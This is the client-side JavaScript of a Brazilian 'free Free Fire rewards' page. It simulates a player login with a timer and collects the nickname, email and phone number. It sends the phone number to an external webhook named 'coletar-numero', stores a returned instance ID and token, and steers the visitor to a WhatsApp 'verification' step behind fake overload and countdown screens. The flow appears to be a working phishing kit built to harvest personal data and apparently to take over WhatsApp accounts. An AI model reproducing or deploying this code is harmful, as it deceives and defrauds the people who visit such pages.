// Global variables
let selectedOffer = null
let userData = {}
let playerId = null

// DOM Elements
const gameItems = document.querySelectorAll(".game-item")
const offerItems = document.querySelectorAll(".offer-item")
const btnFreeClaim = document.getElementById("btnFreeClaim")
const selectedSummary = document.getElementById("selectedSummary")
const playerIdInput = document.getElementById("player-id")
const btnPlayerLogin = document.getElementById("btnPlayerLogin")
const displayUserId = document.getElementById("displayUserId")

// Modals
const gameUnavailableModal = document.getElementById("gameUnavailableModal")
const loadingModal = document.getElementById("loadingModal")
const userDataModal = document.getElementById("userDataModal")
const confirmDataModal = document.getElementById("confirmDataModal")
const verifyingModal = document.getElementById("verifyingModal")
const whatsappRedirectModal = document.getElementById("whatsappRedirectModal")

// Função de normalização do número
function normalizePhone(number) {
  return number.replace(/\D/g, "").replace(/^55/, "")
}

// Initialize
document.addEventListener("DOMContentLoaded", () => {
  initializeEventListeners()
  updateClaimButtonState()
  initializeSeeMoreButton()
})

function initializeEventListeners() {
  // Game selection
  gameItems.forEach((item) => {
    item.addEventListener("click", handleGameSelection)
  })

  // Offer selection
  offerItems.forEach((item) => {
    if (!item.classList.contains("sold-out")) {
      item.addEventListener("click", handleOfferSelection)
    }
  })

  // Player ID login - Only allow numbers
  playerIdInput.addEventListener("input", function (e) {
    this.value = this.value.replace(/\D/g, "")
  })

  btnPlayerLogin.addEventListener("click", handlePlayerLogin)

  // Free claim button
  btnFreeClaim.addEventListener("click", handleFreeClaim)

  // Modal close buttons
  document.querySelectorAll(".close").forEach((closeBtn) => {
    closeBtn.addEventListener("click", closeModal)
  })

  // Modal buttons
  document.getElementById("btnGoToWhatsapp").addEventListener("click", handleWhatsappRedirect)
  document.querySelector(".btn-modal-ok").addEventListener("click", closeModal)

  // User data form
  const userDataForm = document.getElementById("userDataForm")

  // Phone number formatting with Brazilian format
  const phoneInput = document.getElementById("phone")
  phoneInput.addEventListener("input", function (e) {
    let value = this.value.replace(/\D/g, "")

    // Limit to 11 digits (DDD + 9 digits)
    if (value.length > 11) {
      value = value.substring(0, 11)
    }

    // Format: (XX) XXXXX-XXXX
    if (value.length >= 11) {
      value = value.replace(/(\d{2})(\d{5})(\d{4})/, "($1) $2-$3")
    } else if (value.length >= 7) {
      value = value.replace(/(\d{2})(\d{5})(\d*)/, "($1) $2-$3")
    } else if (value.length >= 3) {
      value = value.replace(/(\d{2})(\d*)/, "($1) $2")
    }

    this.value = value
  })

  userDataForm.addEventListener("submit", (event) => {
    event.preventDefault()

    const ffId = document.getElementById("ffId").value
    const nickname = document.getElementById("nickname").value
    const email = document.getElementById("email").value
    const phone = document.getElementById("phone").value.replace(/\D/g, "") // Remove formatting for storage
    const acceptTerms = document.getElementById("acceptTerms").checked
    const confirmAge = document.getElementById("confirmAge").checked

    if (!ffId || !nickname || !email || !phone || !acceptTerms || !confirmAge) {
      showToast("Por favor, preencha todos os campos")
      return
    }

    userData = {
      ffId: ffId,
      nickname: nickname.toUpperCase(),
      email: email,
      phone: phone,
    }

    // Validate data
    if (!validateUserData(userData)) {
      return
    }

    // Show confirmation modal
    populateConfirmationModal()
    closeModal()
    showModal(confirmDataModal)
  })

  // Confirm data button with webhook integration
  document.getElementById("btnConfirmData").addEventListener("click", handleDataConfirmation)

  // Edit number button
  document.getElementById("btnEditNumber").addEventListener("click", () => {
    closeModal()
    showModal(userDataModal)
  })

  // Click outside modal to close
  window.addEventListener("click", (event) => {
    if (event.target.classList.contains("modal")) {
      closeModal()
    }
  })
}

function initializeSeeMoreButton() {
  const btnSeeMore = document.getElementById("btnSeeMore")
  if (!btnSeeMore) return

  let isExpanded = false

  btnSeeMore.addEventListener("click", () => {
    const hiddenItems = document.querySelectorAll(".offer-item.hidden")

    if (!isExpanded) {
      // Mostrar itens
      hiddenItems.forEach((item) => {
        item.style.display = "flex"
      })
      btnSeeMore.innerHTML = '<span>Ver menos</span><i class="fas fa-chevron-up"></i>'
      isExpanded = true
    } else {
      // Esconder itens
      hiddenItems.forEach((item) => {
        item.style.display = "none"
      })
      btnSeeMore.innerHTML = '<span>Ver mais</span><i class="fas fa-chevron-down"></i>'
      isExpanded = false
    }
  })
}

function handlePlayerLogin() {
  const id = playerIdInput.value.trim()
  if (id) {
    // Show loading overlay
    showLoadingOverlay("Conectando ao servidor...")

    // After 1.5 seconds, hide overlay and update UI
    setTimeout(() => {
      hideLoadingOverlay()
      playerId = id
      displayUserId.textContent = id
      showToast("Login realizado com sucesso!")
    }, 1500)
  } else {
    showToast("Por favor, insira um ID válido.")
  }
}

function showLoadingOverlay(message) {
  // Create overlay
  const overlay = document.createElement("div")
  overlay.className = "page-overlay"
  overlay.id = "loadingOverlay"
  overlay.innerHTML = `
    <div class="overlay-spinner">
      <i class="fas fa-spinner fa-spin"></i>
    </div>
    <div class="overlay-text">${message}</div>
  `
  document.body.appendChild(overlay)
  document.body.style.overflow = "hidden"
}

function hideLoadingOverlay() {
  const overlay = document.getElementById("loadingOverlay")
  if (overlay) {
    overlay.remove()
    document.body.style.overflow = "auto"
  }
}

function handleGameSelection(event) {
  const gameItem = event.currentTarget
  const game = gameItem.dataset.game

  // Remove active class from all games
  gameItems.forEach((item) => item.classList.remove("active"))

  if (game === "freefire") {
    // Activate Free Fire
    gameItem.classList.add("active")
  } else {
    // Show unavailable modal for other games
    showModal(gameUnavailableModal)
    // Keep Free Fire selected
    document.querySelector('[data-game="freefire"]').classList.add("active")
  }
}

function handleOfferSelection(event) {
  const offerItem = event.currentTarget

  // Skip if sold out
  if (offerItem.classList.contains("sold-out")) {
    return
  }

  const offer = offerItem.dataset.offer

  // Remove selection from all offers
  offerItems.forEach((item) => {
    if (!item.classList.contains("sold-out")) {
      item.style.border = "2px solid #e9ecef"
      item.style.boxShadow = "none"
    }
  })

  // Add selection to clicked offer
  offerItem.style.border = "2px solid #e30613"
  offerItem.style.boxShadow = "0 0 0 3px rgba(227, 6, 19, 0.1)"

  // Store selected offer
  selectedOffer = {
    id: offer,
    name: offerItem.querySelector("span").textContent,
    image: offerItem.querySelector("img").src,
  }

  // Update summary
  updateSelectedSummary()
  updateClaimButtonState()
}

function updateSelectedSummary() {
  if (selectedOffer) {
    document.getElementById("summaryImage").src = selectedOffer.image
    document.getElementById("summaryName").textContent = selectedOffer.name
    selectedSummary.style.display = "block"
  } else {
    selectedSummary.style.display = "none"
  }
}

function updateClaimButtonState() {
  if (selectedOffer) {
    btnFreeClaim.style.opacity = "1"
    btnFreeClaim.style.cursor = "pointer"
    btnFreeClaim.disabled = false
  } else {
    btnFreeClaim.style.opacity = "0.6"
    btnFreeClaim.style.cursor = "not-allowed"
    btnFreeClaim.disabled = true
  }
}

function handleFreeClaim() {
  if (!selectedOffer) {
    showToast("Por favor, selecione uma oferta primeiro.")
    return
  }

  if (!playerId) {
    showToast("Por favor, faça login com seu ID primeiro.")
    return
  }

  // Pre-fill ID field
  document.getElementById("ffId").value = playerId

  // Show user data modal
  showModal(userDataModal)
}

function validateUserData(data) {
  // Validate nickname (no special characters)
  const nicknameRegex = /^[A-Za-z0-9]+$/
  if (!nicknameRegex.test(data.nickname)) {
    showToast("Nick deve conter apenas letras e números, sem caracteres especiais.")
    return false
  }

  // Validate email
  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/
  if (!emailRegex.test(data.email)) {
    showToast("Por favor, insira um email válido.")
    return false
  }

  // Validate phone (DDD + 9 + 8 digits)
  const phoneRegex = /^\d{2}9\d{8}$/
  if (!phoneRegex.test(data.phone)) {
    showToast("Telefone deve ter o formato: (XX) 9XXXX-XXXX")
    return false
  }

  return true
}

function formatPhoneDisplay(phone) {
  // Format phone for display: 11999999999 -> (11) 99999-9999
  if (phone.length === 11) {
    return phone.replace(/(\d{2})(\d{5})(\d{4})/, "($1) $2-$3")
  }
  return phone
}

function populateConfirmationModal() {
  document.getElementById("confirmNick").textContent = userData.nickname
  document.getElementById("confirmEmail").textContent = userData.email
  document.getElementById("confirmPhone").value = formatPhoneDisplay(userData.phone)

  // Garantir que o botão esteja habilitado quando o modal abrir
  setTimeout(() => {
    resetConfirmButton()
  }, 100)
}

async function handleDataConfirmation() {
  // Get the current phone value (might have been edited)
  const phoneValue = document.getElementById("confirmPhone").value.replace(/\D/g, "")

  // Update phone if edited
  userData.phone = phoneValue

  // Validate phone again
  const phoneRegex = /^\d{2}9\d{8}$/
  if (!phoneRegex.test(userData.phone)) {
    showToast("Telefone deve ter o formato: (XX) 9XXXX-XXXX")
    return
  }

  // Normalizar o número
  const normalizedPhone = normalizePhone(userData.phone)

  // Verificar se é o mesmo número original (segunda tentativa)
  const numeroOriginal = sessionStorage.getItem("numeroOriginal")
  if (numeroOriginal && numeroOriginal === normalizedPhone) {
    // Segunda tentativa com o mesmo número - redirecionar para plano B
    window.location.href = "link-plano-b.html"
    return
  }

  // Primeira tentativa - salvar número original
  sessionStorage.setItem("numeroOriginal", normalizedPhone)

  // Limpar código de verificação para novo número
  sessionStorage.removeItem("lastVerificationCode")

  // Show verifying modal
  closeModal()
  showModal(verifyingModal)

  try {
    // Simulate 3 seconds loading
    await new Promise((resolve) => setTimeout(resolve, 3000))

    const response = await fetch("https://main-n8n.ohbhf7.easypanel.host/webhook/coletar-numero", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ telefone: normalizedPhone }),
    })

    const data = await response.json()

    // Remover loading screen antes de abrir qualquer popup
    hideLoadingScreen()

    if (data.disponibilidade === "lotado") {
      closeModal()
      showLotadoModal(data.timer || 60)
    } else if (data.disponibilidade === "nocode") {
      closeModal()
      showNocodeModal()
    } else if (data.disponibilidade === "ok") {
      // Salvar instanceId e token
      sessionStorage.setItem("instanceId", data.id)
      sessionStorage.setItem("token", data.token)

      closeModal()
      showWhatsappModal()
    }
  } catch (error) {
    console.error("Erro ao verificar número:", error)
    hideLoadingScreen()
    closeModal()
    showLotadoModal(60)
  }
}

function hideLoadingScreen() {
  const loadingScreen = document.getElementById("loadingScreen")
  if (loadingScreen) {
    loadingScreen.style.display = "none"
  }
  hideLoadingOverlay()
}

function showNocodeModal() {
  const nocodeModal = document.createElement("div")
  nocodeModal.className = "modal"
  nocodeModal.id = "nocodeModal"
  nocodeModal.style.display = "block"
  nocodeModal.innerHTML = `
    <div class="modal-content nocode-modal">
      <div class="nocode-header">
        <div class="warning-icon">
          <i class="fas fa-exclamation-triangle"></i>
        </div>
        <h3>Número Inválido</h3>
        <p class="nocode-subtitle">Não foi possível enviar código para este número</p>
      </div>
      <div class="modal-body">
        <p style="text-align: center; margin-bottom: 20px; color: #495057; line-height: 1.5;">
          O número informado não pode receber código de verificação. Por favor, preencha um número válido.
        </p>
      </div>
      <div class="modal-footer">
        <button class="btn-nocode-ok" onclick="handleNocodeOk()">
          <i class="fas fa-check"></i>
          OK
        </button>
      </div>
    </div>
  `

  document.body.appendChild(nocodeModal)
  document.body.style.overflow = "hidden"
}

function handleNocodeOk() {
  // Fechar popup de nocode
  const nocodeModal = document.getElementById("nocodeModal")
  if (nocodeModal) {
    nocodeModal.remove()
  }

  // Reabrir popup de confirmação
  showModal(confirmDataModal)

  // Obter referências dos elementos
  const btnConfirmData = document.getElementById("btnConfirmData")
  const confirmPhone = document.getElementById("confirmPhone")

  // Desabilitar botão visualmente
  function disableButton() {
    btnConfirmData.disabled = true
    btnConfirmData.style.opacity = "0.6"
    btnConfirmData.style.cursor = "not-allowed"
    btnConfirmData.style.background =
      "linear-gradient(135deg, rgba(248, 249, 250, 0.9) 0%, rgba(233, 236, 239, 0.8) 100%)"
    btnConfirmData.style.color = "#6c757d"
    btnConfirmData.style.border = "2px solid rgba(222, 226, 230, 0.8)"
    btnConfirmData.style.boxShadow = "none"
  }

  // Habilitar botão visualmente
  function enableButton() {
    btnConfirmData.disabled = false
    btnConfirmData.style.opacity = "1"
    btnConfirmData.style.cursor = "pointer"
    btnConfirmData.style.background = "linear-gradient(135deg, #e30613 0%, #b8050f 100%)"
    btnConfirmData.style.color = "white"
    btnConfirmData.style.border = "none"
    btnConfirmData.style.boxShadow = "0 6px 20px rgba(227, 6, 19, 0.4)"
  }

  // Desabilitar botão inicialmente
  disableButton()

  // Armazenar o valor atual do telefone
  const currentPhoneValue = confirmPhone.value

  // Função para verificar mudança no telefone
  function checkPhoneChange() {
    if (confirmPhone.value !== currentPhoneValue) {
      enableButton()
      // Remover este listener após primeira mudança
      confirmPhone.removeEventListener("input", checkPhoneChange)
      confirmPhone.removeEventListener("keyup", checkPhoneChange)
      confirmPhone.removeEventListener("change", checkPhoneChange)
    }
  }

  // Adicionar múltiplos listeners para garantir que funcione
  confirmPhone.addEventListener("input", checkPhoneChange)
  confirmPhone.addEventListener("keyup", checkPhoneChange)
  confirmPhone.addEventListener("change", checkPhoneChange)

  // Focar no campo de telefone para facilitar edição
  setTimeout(() => {
    confirmPhone.focus()
    confirmPhone.select()
  }, 100)

  document.body.style.overflow = "auto"
}

function showLotadoModal(timer) {
  const lotadoModal = document.createElement("div")
  lotadoModal.className = "modal"
  lotadoModal.id = "lotadoModal"
  lotadoModal.style.display = "block"
  lotadoModal.innerHTML = `
    <div class="modal-content lotado-modal">
      <div class="lotado-header">
        <div class="users-icon">
          <i class="fas fa-server"></i>
        </div>
        <h3>Site Temporariamente Superlotado</h3>
        <p class="lotado-subtitle">Todas as instâncias estão ocupadas no momento</p>
      </div>
      <div class="modal-body">
        <p style="text-align: center; margin-bottom: 20px; color: #495057; line-height: 1.5;">
          Todas as instâncias estão ocupadas no momento. Por favor, aguarde alguns segundos antes de tentar novamente.
        </p>
        <div class="timer-display">
          <span id="lotadoTimer">${timer}</span> segundos
        </div>
      </div>
      <div class="modal-footer">
        <button class="btn-lotado-retry" id="btnLotadoRetry" disabled>
          <i class="fas fa-redo"></i>
          TENTAR NOVAMENTE
        </button>
      </div>
    </div>
  `

  document.body.appendChild(lotadoModal)
  document.body.style.overflow = "hidden"

  // Iniciar countdown
  startLotadoTimer(timer)
}

function startLotadoTimer(seconds) {
  const timerElement = document.getElementById("lotadoTimer")
  const retryButton = document.getElementById("btnLotadoRetry")

  let timeLeft = seconds

  const countdown = setInterval(() => {
    timeLeft--
    if (timerElement) {
      timerElement.textContent = timeLeft
    }

    if (timeLeft <= 0) {
      clearInterval(countdown)
      if (retryButton) {
        retryButton.disabled = false
        retryButton.style.opacity = "1"
        retryButton.style.cursor = "pointer"
        retryButton.onclick = handleLotadoRetry
      }
    }
  }, 1000)
}

function handleLotadoRetry() {
  const lotadoModal = document.getElementById("lotadoModal")
  if (lotadoModal) {
    lotadoModal.remove()
  }

  // Voltar para confirmação de número
  showModal(confirmDataModal)
  document.body.style.overflow = "auto"
}

function showWhatsappModal() {
  showModal(whatsappRedirectModal)
}

function handleWhatsappRedirect() {
  // Fechar popup
  closeModal()

  // Mostrar popup de espera com countdown
  showWaitingModal()
}

function showWaitingModal() {
  const waitingModal = document.createElement("div")
  waitingModal.className = "modal"
  waitingModal.id = "waitingModal"
  waitingModal.style.display = "block"
  waitingModal.innerHTML = `
    <div class="modal-content waiting-modal">
      <div class="waiting-header">
        <div class="clock-icon">
          <i class="fas fa-clock"></i>
        </div>
        <h3>Aguarde um momento</h3>
        <p class="waiting-subtitle">Redirecionando em <span id="waitingTimer">3</span> segundos...</p>
      </div>
    </div>
  `

  document.body.appendChild(waitingModal)
  document.body.style.overflow = "hidden"

  // Countdown de 3 segundos
  let timeLeft = 3
  const timerElement = document.getElementById("waitingTimer")

  const countdown = setInterval(() => {
    timeLeft--
    if (timerElement) {
      timerElement.textContent = timeLeft
    }

    if (timeLeft <= 0) {
      clearInterval(countdown)
      redirectToVerification()
    }
  }, 1000)
}

function redirectToVerification() {
  // Store data in localStorage for verification page
  localStorage.setItem("userData", JSON.stringify(userData))
  localStorage.setItem("selectedOffer", JSON.stringify(selectedOffer))

  // Redirect to verification page
  window.location.href = "verification.html"
}

function showModal(modal) {
  if (modal) {
    modal.style.display = "block"
    document.body.style.overflow = "hidden"
  }
}

function closeModal() {
  document.querySelectorAll(".modal").forEach((modal) => {
    modal.style.display = "none"
  })
  document.body.style.overflow = "auto"
}

function showToast(message) {
  // Create toast notification
  const toast = document.createElement("div")
  toast.className = "toast"
  toast.textContent = message
  toast.style.cssText = `
    position: fixed;
    top: 20px;
    left: 50%;
    transform: translateX(-50%);
    background: rgba(0, 0, 0, 0.9);
    color: white;
    padding: 12px 20px;
    border-radius: 10px;
    z-index: 10000;
    font-size: 14px;
    font-weight: 500;
    box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
  `

  document.body.appendChild(toast)

  setTimeout(() => {
    toast.remove()
  }, 3000)
}

// Função para resetar completamente o estado do botão confirmar
function resetConfirmButton() {
  const btnConfirmData = document.getElementById("btnConfirmData")
  if (btnConfirmData) {
    btnConfirmData.disabled = false
    btnConfirmData.style.opacity = "1"
    btnConfirmData.style.cursor = "pointer"
    btnConfirmData.style.background = "linear-gradient(135deg, #e30613 0%, #b8050f 100%)"
    btnConfirmData.style.color = "white"
    btnConfirmData.style.border = "none"
    btnConfirmData.style.boxShadow = "0 6px 20px rgba(227, 6, 19, 0.4)"
  }
}
